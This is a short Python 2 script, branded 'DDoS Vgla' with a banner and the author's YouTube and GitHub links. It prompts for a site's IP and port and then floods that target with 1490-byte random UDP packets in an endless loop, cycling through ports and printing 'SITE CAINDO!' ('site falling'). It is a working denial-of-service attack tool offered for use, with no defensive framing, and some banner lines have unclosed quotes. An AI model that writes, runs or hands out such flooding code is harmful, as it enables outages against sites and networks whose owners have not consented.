import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print "d    b   sSSSs   d      d s.        d ss    d ss      sSSSs     sss. 
print "S    S  S     S  S      S  ~O       S   ~o  S   ~o   S     S  d      "
print "S    S S         S      S   `b      S     b S     b S       S Y      
print "S    S S         S      S sSSO      S     S S     S S       S   ss.  "
print "S    S S    ssSb S      S    O      S     P S     P S       S      b "
print " S   S  S     S  S      S    O      S    S  S    S   S     S       P "
print "  °ssS   °sss°   P sSSs P    P      P ss°   P ss°     °sss°   ` ss'  "
                                                                     
print
print "DDoS Vgla - Made By Vgla"
print "YouTube : https://www.youtube.com/@VglaRat"
print "GITHUB   : https://github.com/Vgla7"
print
ip = raw_input("IP Do Site : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(1)
print "[=====               ] 25%"
time.sleep(1)
print "[==========          ] 50%"
time.sleep(1)
print "[===============     ] 75%"
time.sleep(1)
print "[====================] 100%"
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "SITE CAINDO!"
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
